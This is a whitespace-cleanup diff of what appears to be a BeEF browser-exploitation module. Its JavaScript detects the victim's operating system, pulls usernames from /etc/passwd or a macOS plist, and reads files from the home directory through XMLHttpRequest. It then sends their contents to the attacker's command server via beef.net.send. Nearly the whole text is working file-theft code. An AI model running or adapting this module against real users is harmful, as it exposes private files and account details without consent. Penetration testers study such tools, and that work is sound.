@@ -11,7 +11,7 @@
 beef.execute(function() {
 
 result = '';
-       
+
     fileList = ['linux','mac','ios','android','windows']
 
 
@@ -96,10 +96,10 @@ result = '';
 									    tmp.send()
 									    tmp.onreadystatechange=function(){
 										    if(tmp.readyState==4){
-                                                // TODO 
+                                                // TODO
                                                 // Understand plist format to _reliably_ pull out username with regex
 											    //user = tmp.responseText.match(/\x03\x57(.*)\x12/)[1];
-                                                user = tmp.responseText.match(/\x54(.*)\x12\x01/)[1];			
+                                                user = tmp.responseText.match(/\x54(.*)\x12\x01/)[1];
 											    homedir = "/Users/"+user+"/";
 											    grabFiles(homedir,"mac")
 										    }
@@ -107,7 +107,7 @@ result = '';
 									    return true;
 							    }
 				    },
-				
+
 			    linux:{
 			    // Linux username discovery
 				    discover : function(){
@@ -118,7 +118,7 @@ result = '';
 										    if(tmp.readyState==4){
 											    userDir = tmp.responseText.match(/[a-z0-9]*:x:[0-9]{4}:[0-9]{4}:[^:]*:([^:]*)/)[1];
 											    homedir = userDir+"/";
-											
+
 											    grabFiles(homedir,"linux")
 										    }
 									    }
@@ -126,7 +126,7 @@ result = '';
 							    }
 				    },
 
-			
+
 			    ios:{
 			    // Grab ipad stuff
 				    discover : function(){
@@ -159,7 +159,7 @@ result = '';
                         }
                     },
 			    android:{
-			    // figure out what app (gmail, browser, or dolphin?) android 
+			    // figure out what app (gmail, browser, or dolphin?) android
 				    discover : function(){
 								    //document.location="http://kos.io/"
 									    tmp = new XMLHttpRequest()
@@ -181,13 +181,13 @@ result = '';
 									    return true;
 							    }
 				    }
-			
-		
+
+
     }
 
 
     function identify(){
-        
+
         // custom file is specified
         if ('<%== @target_file %>' != 'autodetect') {
             return "custom"
@@ -225,26 +225,26 @@ result = '';
 		    tmpfile[i] = new XMLHttpRequest()
 		    tmpfile[i].open ('get',dir+"/"+fileList[os]['post'][i]);
 		    tmpfile[i].send();
-            
+
 		    tmpfile[i].onreadystatechange=function(){
                 for (j in fileList[os]['post']){
 			        if(tmpfile[j].readyState==4){
                         beef.debug('new returned for: ' + j);
                         result = j +": "+ tmpfile[j].responseText;
-                        
+
                         beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result);
 			        }
                 }
 		    }
-            
 
-	    }	
- 
+
+	    }
+
     }
 
 
     discoverUsers(identify());
-   
-    
+
+
 
 });
